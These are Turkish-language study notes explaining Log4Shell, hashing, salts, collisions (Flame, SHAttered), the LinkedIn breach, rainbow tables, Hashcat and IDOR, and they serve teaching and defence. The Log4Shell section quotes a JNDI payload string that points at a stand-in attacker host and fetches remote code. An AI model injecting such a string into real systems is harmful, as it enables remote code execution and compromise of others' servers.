# Log4Shell Nedir?

Log4Shell, Java tabanlı popüler günlükleme (logging) kütüphanesi olan Log4j üzerinde 2021 yılı sonunda keşfedilen, sistemlerde Uzaktan Kod Çalıştırılmasına (RCE) izin veren kritik bir güvenlik zafiyetidir. Bu açık, kütüphanenin günlük mesajları içindeki JNDI (Java Naming and Directory Interface) aramalarını hatalı bir şekilde işlemesinden kaynaklanır. Bir saldırgan, kullanıcı adı veya HTTP başlığı gibi günlüğe kaydedileceğini bildiği bir alana `${jndi:ldap://saldirgan.com/KotuculKod}` gibi özel bir dize göndererek, hedef sunucunun kendi kontrolündeki bir adresten kötü amaçlı Java kodunu çekip belleğinde çalıştırmasını sağlayabilir.

Bu zafiyet, sömürülmesinin çok kolay olması ve Log4j kütüphanesinin bulut hizmetlerinden kurumsal yazılımlara kadar modern internet altyapısının neredeyse her yerinde kullanılması nedeniyle 10.0 üzerinden 10.0 tam kritiklik puanı (CVSS) almıştır. Log4Shell, saldırganların hedef sistemlerde tam yetki kazanarak veri çalmasına, fidye yazılımı yüklemesine veya kalıcı arka kapılar oluşturmasına zemin hazırladığı için siber güvenlik tarihinin en tehlikeli olaylarından biri olarak kabul edilir. Kriptografik bir hata değil, bir girdi doğrulama ve işlem hatası sonucunda ortaya çıkmıştır.

# Hashing Nedir?

Hashing, değişken boyuttaki herhangi bir veri bloğunu matematiksel fonksiyonlar aracılığıyla sabit uzunlukta (SHA-256: 64 hexadecimal karakter, 256 bit) benzersiz bir değere (hash) dönüştürme işlemidir. Girdideki tek bir karakterin bile değişmesi durumunda tamamen farklı bir hash'in oluştuğu "çığ etkisi" (avalanche effect) özelliğine sahiptir. Hashing; veri bütünlüğünü doğrulamak, parolaları güvenli saklamak ve blok zinciri teknolojisinde verilerin değiştirilemezliğini sağlamak için temel bir araçtır.

Bir kriptografik hash fonksiyonunun güvenli kabul edilmesi için:
- Aynı girdi her zaman aynı çıktıyı üretir.
- Hash değerinden orijinal girdiye ulaşılamamalı, "tek yönlü" olmalıdır.
- İki farklı girdi aynı hash değerini oluşturmamalı, "çakışmaya dirençli" olmalıdır.

MD5 ve SHA-1 collision'a karşı dayanıklı olmadığından dolayı günümüzde güvenli olmadığı kabul edilir. Bu sebeple daha güvenli olan SHA-256 algoritmasının kullanılması tavsiye edilmektedir.

> Hashing, authentication (kimlik doğrulama) ile birlikte kullanılarak bir mesajın değiştirilmediğine dair güçlü kanıt sağlar.

## Örnek

1. Ali mesajı hazırlıyor: `Maaş: 50000TL`
2. Ali mesajın hash'ini oluşturuyor: `8F3A91...`
3. Ali hash'i private key ile imzalıyor.
4. Yolda saldırgan mesajı değiştirmiş olsun: `Maaş: 90000TL`
5. Ayşe mesajı alıyor, Ali'nin public key'i ile imza doğrulaması yapıyor (hash: `8F3A91...` çıkıyor) ve bu kişinin Ali olduğunu anlıyor.
6. Mesajı yeniden hash'liyor, fakat artık hash: `C7D812...`
7. Hash'leri karşılaştırıyor: Ali'nin imzasındaki ile Ayşe'nin hesapladığı hash farklı; böylece Ayşe mesajın değiştirildiğini tespit etmiş oluyor.

> Saldırgan, saldırı sırasında yeni bir mesaj için yeni hash oluşturabilir fakat sahte bir kişisel imza (private key) oluşturamaz.

# Encoding vs. Hashing

Bu iki yöntem, veriyi dönüştürme amaçları bakımından birbirinden tamamen ayrılır. Encoding, veriyi güvenliği sağlamak için değil, farklı sistemler arasında uyumluluk, taşınabilirlik ve verinin güvenli iletimi (usability) için kullanılan, herkesin erişebileceği yöntemlerle tamamen geri döndürülebilir bir işlemdir. Hashing ise verinin içeriğini gizlemekten ziyade bütünlüğünü (integrity) ve doğruluğunu garanti altına almayı hedefler; bu işlem geri döndürülemez ve matematiksel olarak tek yönlüdür. Kodlama için herhangi bir anahtar gerekmezken, hashing işleminde veri sadece karşılaştırma amacıyla kullanılır.

# Neden Base64 ile Parola Saklamıyoruz?

Geliştiriciler arasında yaygın bir hata, Base64 gibi kodlama yöntemlerini bir güvenlik katmanı (obfuscation) olarak görmektir. Base64 bir şifreleme veya hashing yöntemi değildir; çıktı güvenli görünse de saniyeler içinde geri döndürülebilir ve herhangi bir gizli anahtar gerektirmez. Eğer bir veritabanı ele geçirilirse, saldırganlar tek bir satırlık kodla Base64 ile kodlanmış tüm parolaları düz metin haline getirebilir, bu da parolaları hiç korumadan saklamakla aynı riski taşır. Ayrıca Base64 deterministik olduğu için aynı parola her zaman aynı çıktıyı üretir, bu da saldırganların yaygın parolaları kolayca tanımasına neden olur.

# Veri Bütünlüğü (Data Integrity)

Veri bütünlüğü, verinin iletimi veya depolanması sırasında yetkisiz kişilerce veya sistem hataları nedeniyle değiştirilmediğinin garanti edilmesidir. Hashing bu noktada kritik bir rol oynar: Gönderici veriyi hash'ler ve bu özeti imzalar; alıcı ise gelen veriyi tekrar hash'leyerek orijinal özetle karşılaştırır. Eğer değerler eşleşiyorsa verinin değişmediği anlaşılır. Blok zinciri teknolojisinde her veri bloğu bir önceki bloğun hash değerini içerir; bu yapı, zincirdeki herhangi bir halkada yapılacak manipülasyonun anında tespit edilmesini sağlayarak verinin imha edilemezliğini ve bütünlüğünü korur.

**Veri bütünlüğü türleri:**
- **Entity integrity:** Her kayıt benzersizdir.
- **Physical integrity:** Veriyi donanım arızaları, elektrik kesintileri, doğal afetlere karşı korur.
- **Referential integrity:** Veritabanındaki tablolar arası ilişkiler.
- **Domain integrity:** Verinin doğru formatta ve izin verilen değerlerde olmasını sağlar.
- **User-defined integrity:** Kurumun kendi belirlediği özel kurallar.

**Kullanılan yöntemler:**
- Veri doğrulama (Validation)
- Hata kontrolü (Error checking)
- Şifreleme (Encryption)
- Erişim kontrolü (Access control)
- Yedekleme (Backup)

# Neden Düz Metin (Plaintext) Tutmamalıyız?

Parolaların veritabanında düz metin olarak saklanması, siber güvenlikte yapılabilecek en tehlikeli hatalardan biridir; çünkü bir veri sızıntısı durumunda saldırganlar herhangi bir çaba harcamadan tüm kullanıcı hesaplarına doğrudan erişim kazanır. Bu durum sızıntının etkisini kontrol edilemez hale getirir ve telafisi olmayan bir kimlik hırsızlığı riskine yol açar. Hashing, veritabanı ele geçirilse bile saldırganın elindeki veriyi anlamsız hale getiren son savunma hattıdır; bu sayede bir sunucu sızıntısı doğrudan bir parola sızıntısına dönüşmez.

# Hash Collision Nedir?

Farklı iki girdinin, aynı hash değerini üretmesi durumuna çakışma (hash collision) denir. İdeal bir kriptografik fonksiyon için bu durumun matematiksel olarak imkansıza yakın olması gerekir. Bir algoritmanın (örneğin MD5) çakışmaya karşı direncinin kırılması, saldırganların Microsoft gibi güvenilir kurumlar adına sahte dijital sertifikalar veya imzalı yazılım güncellemeleri üretmesine olanak tanıyabilir. Çakışmalar, "doğum günü saldırısı" gibi genel yöntemlerle veya karmaşık matematiksel analizlerle bulunabilir.

# Flame (Flamer, SkyWIper) 2012 Olayı Nedir?

Flame, 2012 yılında keşfedilen ve özellikle Orta Doğu'daki sistemleri hedef alan son derece gelişmiş bir zararlı yazılımdır. Bu olay siber güvenlik dünyasında bir dönüm noktasıdır; çünkü saldırganlar MD5 algoritmasındaki bir çakışma zafiyetini (chosen-prefix collision) kullanarak Microsoft'tan gelmiş gibi görünen sahte bir kod imzalama sertifikası üretmeyi başarmışlardır. Bu sayede Flame, kendini Windows Güncellemesi olarak gizleyerek yerel ağlardaki bilgisayarlara yayılabilmiştir. Bu saldırı, teorik kriptografik zayıflıkların gerçek dünyada ne kadar yıkıcı olabileceğini kanıtlamıştır.

Flame'in amacı, sistemlere zarar vermek değil gizlice bilgi toplamak ve casusluk yapmaktır. Bu zararlı yazılım: dosyaları çalabiliyor, ekran görüntüsü alabiliyor, mikrofonu açıp ortam sesini kaydedebiliyor, klavye tuşlarını (keylogging) kaydedebiliyor, ağ üzerindeki diğer bilgisayarlara yayılabiliyor ve bluetooth üzerinden yakındaki cihazlar hakkında bilgi toplayabiliyordu. Çok modüllü yapısı sayesinde ihtiyaç duyduğu özellikleri sonradan yükleyebiliyordu.

# SHAttered Attack

2017 yılında duyurulan ve SHA-1 hash algoritmasına karşı gerçekleştirilen ilk pratik çakışma (collision) saldırısıdır.
- Google ve CWI işbirliği ile gerçekleştirildi.
- İki farklı pdf dosyası oluşturuldu. Dosyalar birbirinden farklı olmasına rağmen aynı SHA-1 hash değerini üretti.
- SHA-1 algoritmasının güvenli olmadığı kesin olarak teyit edilmiş, SHA-256 ve SHA-3 gibi daha güvenli algoritmalara geçiş hızlanmıştır.

# Salt Hash Nedir?

Salt, her kullanıcının parolasına hash'lenmeden önce eklenen benzersiz ve rastgele bir veri dizisidir. Salt kullanımı, aynı parolayı seçen iki farklı kullanıcının hash değerlerinin birbirinden farklı olmasını garanti eder ve böylece öngörülebilirliği ortadan kaldırır. Bu yöntem, saldırganların önceden hesaplanmış tablolarla (Rainbow Table) toplu parola kırmasını engellediği için zorunlu bir savunma mekanizmasıdır. Salt'ın gizli tutulması gerekmez; veritabanında hash değerinin yanında saklanır ve görevi parolayı gizlemek değil, her hash işlemini benzersiz kılmaktır.

# LinkedIn Hack (2012) Olayı Nedir?

LinkedIn, 2012 yılında yaklaşık 117 milyon kullanıcının parola verilerinin çalındığı devasa bir veri sızıntısı yaşamıştır. Bu olayın kriptografik açıdan en önemli dersi, şirketin parolaları tuzlanmamış (unsalted) SHA-1 kullanarak saklamasıdır. Salt kullanılmadığı için saldırganlar, sızan hash'leri Rainbow Table kullanarak saniyeler içinde düz metin parolalara dönüştürebilmiştir. Bu ihmal, "123456" gibi zayıf parolaları kullanan milyonlarca hesabın çok hızlı bir şekilde ele geçirilmesine ve çalınan verilerin karaborsada satılmasına yol açmıştır.

# Rainbow Table

Rainbow Table, çalınan hash'leri düz metin parolalara dönüştürmek için kullanılan, önceden hesaplanmış hash zincirlerinden oluşan devasa bir veri yapısıdır. Bu yöntem, işlemci gücü yerine depolama alanını kullanarak (time-memory trade-off) parolaları kırma hızını muazzam ölçüde artırır. Tablo, özetleri tekrar olası parolalara eşleyen "indirgeme fonksiyonları" (reduction functions) kullanarak sadece zincirlerin başlangıç ve bitiş noktalarını saklar, böylece trilyonlarca parola-hash çiftini daha küçük bir alanda depolar. Salt (tuzlama) kullanımı, bu tabloları tamamen işlevsiz kılar.

# Hashcat

Hashcat, dünyanın en hızlı ve en güçlü açık kaynaklı parola kırma aracı olarak bilinir. Bu aracın en büyük avantajı, işlemci (CPU) yerine Ekran Kartı (GPU) hızlandırmasını kullanmasıdır; GPU'ların paralel işlem yeteneği sayesinde saniyede milyarlarca hatta trilyonlarca deneme yapabilir. Hashcat; sözlük, brute-force, kural tabanlı ve birleştirici (combinator) gibi 300'den fazla formatı destekleyen çeşitli saldırı modlarına sahiptir. Siber güvenlik uzmanları bu aracı sistemlerdeki zayıf parola politikalarını denetlemek, dijital adli tıp incelemeleri yapmak ve kaybolan kimlik bilgilerini kurtarmak için kullanır.

# Endpoint Kırılımı

**Endpoint:** API'ın belirli bir adresi demektir.

Kullanıcıdan gelen özel karakterlerin (`?`, `&`, `=`, boşluk, `/` vb.) encode edilmemesi nedeniyle URL'nin veya API endpoint'inin yapısının bozulmasıdır. URL Encoding yapılarak bu karakterler güvenli biçime dönüştürülür ve endpoint doğru şekilde çalışır.

# IDOR (Insecure Direct Object Reference)

Bir kullanıcının sadece URL veya parametredeki bir kimliği (ID) değiştirerek başka kullanıcıya ait verilere yetkisiz bir şekilde erişebildiği güvenlik açığıdır.
